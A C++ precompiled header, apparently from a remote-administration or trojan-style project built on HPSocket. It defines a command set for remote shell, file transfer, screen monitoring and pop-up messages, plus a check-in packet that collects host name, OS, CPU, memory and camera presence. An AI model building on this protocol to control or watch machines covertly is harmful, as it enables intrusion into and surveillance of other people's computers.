// pch.h: 这是预编译标头文件。
// 下方列出的文件仅编译一次，提高了将来生成的生成性能。
// 这还将影响 IntelliSense 性能，包括代码完成和许多代码浏览功能。
// 但是，如果此处列出的文件中的任何一个在生成之间有更新，它们全部都将被重新编译。
// 请勿在此处添加要频繁更新的文件，这将使得性能优势无效。

#ifndef PCH_H
#define PCH_H

// 添加要在此处预编译的标头
#include "framework.h"

#include <iostream>

#include "./HPSocket/HPSocket.h"

#ifdef _WIN64
	#ifdef _DEBUG
		#pragma comment(lib, "./HPSocket/HPSocket_UD.lib")
	#else
		#pragma comment(lib, "./HPSocket/HPSocket_U.lib")
	#endif
#else
	#ifdef _DEBUG
		#pragma comment(lib, "./HPSocket/HPSocket_UD.lib")
	#else
		#pragma comment(lib, "./HPSocket/HPSocket_U.lib")
	#endif
#endif


#define xmalloc(s) HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,(s))
#define xfree(p)   HeapFree(GetProcessHeap(),0,(p))

// 第三个参数是MultiByte的最大字节数
#define myW2A(lpSrcWideCharStr, lpDestMultiByte, dwMultiBytes) WideCharToMultiByte(CP_ACP, 0, (lpSrcWideCharStr), -1, (lpDestMultiByte), (dwMultiBytes), NULL, NULL)

enum COMMAND_ID {
	CRYPTO_KEY,				// 传递通信密钥和IV
	
	LOGIN,					// 上线包

	ECHO,					// 测试

	SHELL_REMOTE,			// 远程SHELL
	FILE_TRANSFOR,			// 文件传输
	SCREEN_MONITOR,			// 屏幕监控
	MESSAGE_BOX,			// 弹窗
};




#define LOGIN_PACKET_BODY_LENGTH (50+30+80+30+1)

typedef struct _LOGIN_INFO {
	CHAR			szHostName[50];		// 主机名
	CHAR			szOsVersion[30];	// 操作系统版本
	CHAR			szCpuType[80];		// CPU型号、主频等
	CHAR			szMemoryInfo[30];	// 内存
	BOOL			bHaveCamera;		// 是否有摄像头

	VOID StructToBuffer(PBYTE pbBuffer) {
		memcpy(pbBuffer, szHostName, 50);
		memcpy(pbBuffer + 50, szOsVersion, 30);
		memcpy(pbBuffer + 80, szCpuType, 80);
		memcpy(pbBuffer + 160, szMemoryInfo, 30);
		pbBuffer[50 + 30 + 80 + 30] = (BYTE)bHaveCamera;
	}

	_LOGIN_INFO() {
		ZeroMemory(&szHostName, 50);
		ZeroMemory(&szOsVersion, 30);
		ZeroMemory(&szCpuType, 80);
		ZeroMemory(&szMemoryInfo, 30);
		bHaveCamera = false;
	}

	_LOGIN_INFO(PBYTE pbBuffer) {
		memcpy(szHostName, pbBuffer, 50);
		memcpy(szOsVersion, pbBuffer + 50, 30);
		memcpy(szCpuType, pbBuffer + 80, 80);
		memcpy(szMemoryInfo, pbBuffer + 160, 30);
		bHaveCamera = pbBuffer[190];
	}
}LOGIN_INFO, *PLOGIN_INFO;






#endif //PCH_H
